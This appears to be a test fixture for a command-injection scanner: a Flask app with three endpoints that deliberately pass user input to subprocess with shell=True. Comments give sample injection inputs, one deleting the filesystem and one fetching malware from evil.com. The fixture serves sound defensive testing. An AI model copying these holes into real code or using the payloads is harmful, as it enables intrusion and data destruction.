# Fixture: py-subprocess-shell-true — subprocess.run() with shell=True
# Expected: TRUE POSITIVE (high confidence)
# CWE: CWE-78
# Agent: cmdi
# Pattern: User input in format string passed to subprocess with shell=True

import subprocess
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)


@app.route("/api/convert", methods=["POST"])
def convert_document():
    """Convert a document to PDF using LibreOffice headless."""
    input_path = request.json.get("input_path")
    output_dir = request.json.get("output_dir", "/tmp/converted")
    # VULNERABLE: shell=True with .format() interpolation of user input
    # Attacker sends: {"input_path": "doc.docx; rm -rf /"}
    cmd = "libreoffice --headless --convert-to pdf --outdir {} {}".format(
        output_dir, input_path
    )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return jsonify({"returncode": result.returncode, "stderr": result.stderr})


@app.route("/api/thumbnail")
def generate_thumbnail():
    """Generate a thumbnail from an image using ImageMagick."""
    source = request.args.get("source")
    width = request.args.get("width", "200")
    # VULNERABLE: shell=True with f-string, both source and width user-controlled
    # Attacker sends: ?source=img.png;+wget+http://evil.com/malware+-O+/tmp/m
    result = subprocess.run(
        f"convert {source} -thumbnail {width}x /tmp/thumb_{source}",
        shell=True,
        capture_output=True,
    )
    if result.returncode == 0:
        return send_file(f"/tmp/thumb_{source}")
    return jsonify({"error": "conversion failed"}), 500


@app.route("/api/dns")
def dns_lookup():
    """Perform DNS lookup for a given domain."""
    domain = request.args.get("domain")
    record_type = request.args.get("type", "A")
    # VULNERABLE: subprocess.Popen with shell=True and %-formatting
    proc = subprocess.Popen(
        "dig +short %s %s" % (record_type, domain),
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, stderr = proc.communicate(timeout=10)
    return jsonify({"records": stdout.decode().strip().split("\n")})
